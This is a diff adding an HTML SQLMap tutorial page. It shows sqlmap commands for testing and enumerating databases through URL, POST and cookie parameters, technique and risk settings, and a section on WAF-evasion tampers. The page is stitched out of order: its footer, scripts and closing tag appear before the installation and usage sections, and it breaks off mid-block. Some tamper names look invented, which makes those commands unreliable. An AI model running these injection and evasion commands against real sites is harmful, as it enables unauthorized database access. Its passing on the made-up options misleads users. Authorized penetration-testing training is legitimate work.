+        <span style="color: #ff6b6b;">stage</span>(<span style="color: #ffff00;">'Deploy to Production'</span>) <span style="color: #ccc;">{</span>
+            <span style="color: #ff6b6b;">when</span> <span style="color: #ccc;">{</span>
+                <span style="color: #ff6b6b;">expression</span> <span style="color: #ccc;">{ currentBuild.result == null }</span>
+            <span style="color: #ccc;">}</span>
+            <span style="color: #ff6b6b;">steps</span> <span style="color: #ccc;">{</span>
+                <span style="color: #44ff44;">sh</span> <span style="color: #ffff00;">'deploy-to-production.sh'</span>
+            <span style="color: #ccc;">}</span>
+        <span style="color: #ccc;">}</span>
+    <span style="color: #ccc;">}</span>
+<span style="color: #ccc;">}</span></pre>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Advanced Detection Evasion Research</h3>
+            <div class="code-block">
+                <pre><span class="command"># Research new evasion techniques</span>
+<span class="command">python sqlmap.py -u "target" --list-tampers | grep -i "bypass\|evas\|waf"</span>
+
+<span class="command"># Test against specific WAF vendors</span>
+<span class="command">python sqlmap.py -u "target" --tamper=cloudflarebypass --identify-waf</span>
+
+<span class="command"># Custom payload fuzzing</span>
+<span class="command">python sqlmap.py -u "target" --suffix=")-- " --prefix="' OR ('"</span>
+
+<span class="command"># Machine learning bypass research</span>
+<span class="command">python sqlmap.py -u "target" --tamper=ml_bypass --technique=B</span></pre>
+            </div>
+        </section>
+
+        <footer style="text-align: center; margin-top: 60px; padding: 40px; background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #0a0a0a); border-radius: 15px; border: 2px solid #333; position: relative; overflow: hidden;">
+            <div style="position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, #ff0080, #00ff80, #0080ff, #ff0080); animation: rainbow 3s linear infinite;"></div>
+            
+            <h3 style="color: #fff; margin-bottom: 20px; font-size: 1.8em; text-transform: uppercase; letter-spacing: 2px;">SQLMap Complete Mastery</h3>
+            <p style="color: #aaa; margin-bottom: 15px; font-size: 1.1em;">Advanced SQL Injection Testing & Exploitation Framework</p>
+            
+            <div style="margin: 25px 0; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+                <div class="technique-badge" style="background: linear-gradient(45deg, #ff4444, #ff6666);">Penetration Testing</div>
+                <div class="technique-badge" style="background: linear-gradient(45deg, #44ff44, #66ff66);">Security Assessment</div>
+                <div class="technique-badge" style="background: linear-gradient(45deg, #4444ff, #6666ff);">Vulnerability Research</div>
+                <div class="technique-badge" style="background: linear-gradient(45deg, #ffff44, #ffff66);">Ethical Hacking</div>
+            </div>
+            
+            <div style="border-top: 2px solid #333; margin: 25px 0; padding-top: 20px;">
+                <p style="color: #888; font-size: 0.95em; margin-bottom: 10px; font-style: italic;">
+                    "With great power comes great responsibility"
+                </p>
+                <p style="color: #666; font-size: 0.85em;">
+                    <strong>⚖️ Legal Notice:</strong> This tool is for authorized security testing only. 
+                    Unauthorized use may violate laws and result in severe penalties.
+                </p>
+            </div>
+            
+            <div style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px; border: 1px solid #444;">
+                <span style="color: #555; font-family: monospace;">v2.0 | Comprehensive SQLMap Guide | Educational Use Only</span>
+            </div>
+            
+            <style>
+                @keyframes rainbow {
+                    0% { background-position: 0% 50%; }
+                    100% { background-position: 100% 50%; }
+                }
+            </style>
+        </footer>
+
+        <button class="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" id="scrollTop">
+            <span style="font-size: 1.2em;">↑</span>
+        </button>
+    </div>
+
+    <script>
+        // Enhanced scroll to top functionality
+        window.addEventListener('scroll', function() {
+            const scrollTop = document.getElementById('scrollTop');
+            const scrollPercent = (document.documentElement.scrollTop || document.body.scrollTop) / 
+                ((document.documentElement.scrollHeight || document.body.scrollHeight) - document.documentElement.clientHeight) * 100;
+            
+            if (scrollPercent > 10) {
+                scrollTop.style.display = 'block';
+                scrollTop.style.opacity = Math.min((scrollPercent - 10) / 20, 1);
+            } else {
+                scrollTop.style.display = 'none';
+            }
+        });
+
+        // Enhanced smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                    
+                    // Add highlight effect
+                    target.style.transform = 'scale(1.01)';
+                    target.style.transition = 'transform 0.3s ease';
+                    setTimeout(() => {
+                        target.style.transform = 'scale(1)';
+                    }, 300);
+                }
+            });
+        });
+
+        // Enhanced hover effects for interactive elements
+        document.querySelectorAll('.code-block, .feature-card, .attack-vector').forEach(element => {
+            element.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-2px)';
+                this.style.transition = 'all 0.3s ease';
+                this.style.boxShadow = '0 12px 35px rgba(0,0,0,0.6)';
+            });
+            
+            element.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0)';
+                this.style.boxShadow = '';
+            });
+        });
+
+        // Terminal typing effect with enhanced realism
+        function typeWriter(element, text, speed = 30) {
+            const originalText = element.textContent;
+            const prompt = originalText.match(/^[^#]*#\s*/)?.[0] || 'root@kali:~# ';
+            let i = 0;
+            element.innerHTML = prompt;
+            
+            function type() {
+                if (i < text.length) {
+                    if (text.charAt(i) === ' ' && Math.random() > 0.7) {
+                        // Simulate realistic typing pauses
+                        setTimeout(type, speed * 3);
+                    } else {
+                        element.innerHTML += text.charAt(i);
+                        setTimeout(type, speed + Math.random() * 20);
+                    }
+                    i++;
+                } else {
+                    // Add blinking cursor
+                    element.innerHTML += '<span class="cursor" style="animation: blink 1s infinite;">_</span>';
+                }
+            }
+            
+            // Add CSS for blinking cursor
+            if (!document.querySelector('#cursor-style')) {
+                const style = document.createElement('style');
+                style.id = 'cursor-style';
+                style.textContent = '@keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }';
+                document.head.appendChild(style);
+            }
+            
+            setTimeout(type, 500); // Initial delay
+        }
+
+        // Initialize enhanced typing effects
+        const terminals = document.querySelectorAll('.terminal');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting && !entry.target.dataset.typed) {
+                    const fullText = entry.target.textContent;
+                    const textWithoutPrompt = fullText.replace(/^[^#]*#\s*/, '');
+                    entry.target.dataset.typed = 'true';
+                    typeWriter(entry.target, textWithoutPrompt);
+                }
+            });
+        }, { threshold: 0.5 });
+
+        terminals.forEach(terminal => {
+            observer.observe(terminal);
+        });
+
+        // Enhanced console ASCII art and information
+        console.log(`
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║   ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗                        ║
+║   ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗                       ║
+║   ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝                       ║
+║   ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝                        ║
+║   ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║                            ║
+║   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝                            ║
+║                                                                               ║
+║                    Complete SQLMap Mastery Guide                              ║
+║                                                                               ║
+║   Features:                                                                   ║
+║   ✓ Comprehensive SQL Injection Testing                                      ║
+║   ✓ Advanced Evasion Techniques                                              ║
+║   ✓ Database Enumeration & Exploitation                                      ║
+║   ✓ Post-Exploitation Techniques                                             ║
+║   ✓ Professional Reporting Framework                                         ║
+║                                                                               ║
+║   ⚠️  Use only with explicit authorization!                                   ║
+║   📚 Educational and authorized testing purposes only                        ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+        `);
+
+        // Add interactive elements counter
+        let interactionCount = 0;
+        document.addEventListener('click', function() {
+            interactionCount++;
+            if (interactionCount === 10) {
+                console.log('🎯 SQLMap Master in the making! Keep exploring the guide.');
+            } else if (interactionCount === 25) {
+                console.log('🚀 Advanced level unlocked! You\'re becoming proficient.');
+            } else if (interactionCount === 50) {
+                console.log('👑 Elite SQLMap practitioner! Remember: with great power...');
+            }
+        });
+
+        // Performance monitoring
+        window.addEventListener('load', function() {
+            const loadTime = performance.now();
+            console.log(`⚡ Guide loaded in ${Math.round(loadTime)}ms`);
+        });
+    </script>
+</body>
+</html>
+                <pre><span class="comment"># Ubuntu/Debian</span>
+<span class="command">sudo apt update && sudo apt install sqlmap</span>
+
+<span class="comment"># Arch Linux</span>
+<span class="command">sudo pacman -S sqlmap</span>
+
+<span class="comment"># macOS (Homebrew)</span>
+<span class="command">brew install sqlmap</span>
+
+<span class="comment"># Python pip</span>
+<span class="command">pip install sqlmap</span></pre>
+            </div>
+
+            <h4>Method 3: Docker Installation</h4>
+            <div class="code-block">
+                <pre><span class="command">docker pull paoloo/sqlmap</span>
+<span class="command">docker run --rm -it paoloo/sqlmap -u "http://target.com/page?id=1"</span></pre>
+            </div>
+
+            <h4>Method 4: Windows Installation</h4>
+            <div class="code-block">
+                <pre><span class="comment"># Download from GitHub</span>
+<span class="command">wget https://github.com/sqlmapproject/sqlmap/archive/master.zip</span>
+<span class="command">unzip master.zip</span>
+<span class="command">cd sqlmap-master</span>
+<span class="command">python sqlmap.py --version</span></pre>
+            </div>
+
+            <div class="success">
+                <strong>✅ Verification:</strong> Run <code>python sqlmap.py --version</code> to confirm successful installation and check the current version.
+            </div>
+
+            <h3>Initial Setup and Updates</h3>
+            <div class="code-block">
+                <pre><span class="command"># Update SQLMap to latest version</span>
+<span class="command">python sqlmap.py --update</span>
+
+<span class="command"># Check for dependencies</span>
+<span class="command">python sqlmap.py --dependencies</span>
+
+<span class="command"># Purge output directory</span>
+<span class="command">python sqlmap.py --purge</span></pre>
+            </div>
+        </section>
+
+        <section id="basic-usage" class="section">
+            <h2>Basic Usage</h2>
+
+            <h3>Simple Vulnerability Test</h3>
+            <div class="terminal">python sqlmap.py -u "http://target.com/page?id=1"</div>
+
+            <h3>POST Data Testing</h3>
+            <div class="terminal">python sqlmap.py -u "http://target.com/login" --data "username=admin&password=test"</div>
+
+            <h3>Cookie-based Testing</h3>
+            <div class="terminal">python sqlmap.py -u "http://target.com/page" --cookie "PHPSESSID=abc123; security=low"</div>
+
+            <h3>Basic Output Interpretation</h3>
+            <div class="code-block">
+                <pre><span class="output">[12:30:15] [INFO] testing connection to the target URL
+[12:30:15] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:30:16] [INFO] testing if the target URL content is stable
+[12:30:17] [INFO] target URL content is stable
+[12:30:17] [INFO] testing if GET parameter 'id' is dynamic
+[12:30:17] [INFO] GET parameter 'id' appears to be dynamic
+[12:30:18] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[12:30:18] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[12:30:18] [INFO] testing for SQL injection on GET parameter 'id'</span></pre>
+            </div>
+
+            <h3>Core Command Structure</h3>
+            <div class="attack-vector risk-high">
+                <h4>Basic Syntax Pattern</h4>
+                <div class="payload-example">
+                    python sqlmap.py [TARGET] [OPTIONS] [ENUMERATION] [TECHNIQUES]
+                </div>
+                <ul style="margin-top: 15px; color: #ccc;">
+                    <li><strong>TARGET:</strong> -u URL, -r request_file, -l log_file</li>
+                    <li><strong>OPTIONS:</strong> --level, --risk, --threads, --delay</li>
+                    <li><strong>ENUMERATION:</strong> --dbs, --tables, --columns, --dump</li>
+                    <li><strong>TECHNIQUES:</strong> --technique, --tamper, --os-shell</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="detection-techniques" class="section">
+            <h2>Detection Techniques</h2>
+
+            <h3>SQLMap Injection Techniques</h3>
+            <table class="option-table">
+                <thead>
+                    <tr>
+                        <th>Technique</th>
+                        <th>Code</th>
+                        <th>Description</th>
+                        <th>Speed</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Boolean-based blind</td>
+                        <td>B</td>
+                        <td>True/False response analysis</td>
+                        <td>Slow</td>
+                    </tr>
+                    <tr>
+                        <td>Time-based blind</td>
+                        <td>T</td>
+                        <td>Response time delay analysis</td>
+                        <td>Very Slow</td>
+                    </tr>
+                    <tr>
+                        <td>Error-based</td>
+                        <td>E</td>
+                        <td>Database error message extraction</td>
+                        <td>Fast</td>
+                    </tr>
+                    <tr>
+                        <td>Union query-based</td>
+                        <td>U</td>
+                        <td>UNION SELECT statements</td>
+                        <td>Very Fast</td>
+                    </tr>
+                    <tr>
+                        <td>Stacked queries</td>
+                        <td>S</td>
+                        <td>Multiple query execution</td>
+                        <td>Fast</td>
+                    </tr>
+                    <tr>
+                        <td>Inline queries</td>
+                        <td>Q</td>
+                        <td>Nested SELECT statements</td>
+                        <td>Fast</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Technique Selection</h3>
+            <div class="code-block">
+                <pre><span class="command"># Test specific techniques only</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --technique=BEUST</span>
+
+<span class="command"># Boolean and time-based only</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --technique=BT</span>
+
+<span class="command"># Union-based only (fastest)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --technique=U</span>
+
+<span class="command"># Error-based only</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --technique=E</span></pre>
+            </div>
+
+            <h3>Detection Level and Risk</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>Level Parameter (1-5)</h4>
+                    <p>Controls test aggressiveness and payload variety:</p>
+                    <ul style="margin-top: 10px; color: #ccc;">
+                        <li><strong>Level 1:</strong> Basic GET parameters</li>
+                        <li><strong>Level 2:</strong> HTTP Cookie headers</li>
+                        <li><strong>Level 3:</strong> HTTP User-Agent/Referer</li>
+                        <li><strong>Level 4:</strong> HTTP Host header</li>
+                        <li><strong>Level 5:</strong> All HTTP headers</li>
+                    </ul>
+                </div>
+                <div class="feature-card">
+                    <h4>Risk Parameter (1-3)</h4>
+                    <p>Controls payload risk and potential damage:</p>
+                    <ul style="margin-top: 10px; color: #ccc;">
+                        <li><strong>Risk 1:</strong> Safe payloads only</li>
+                        <li><strong>Risk 2:</strong> Heavy query time delays</li>
+                        <li><strong>Risk 3:</strong> OR-based payloads</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="code-block">
+                
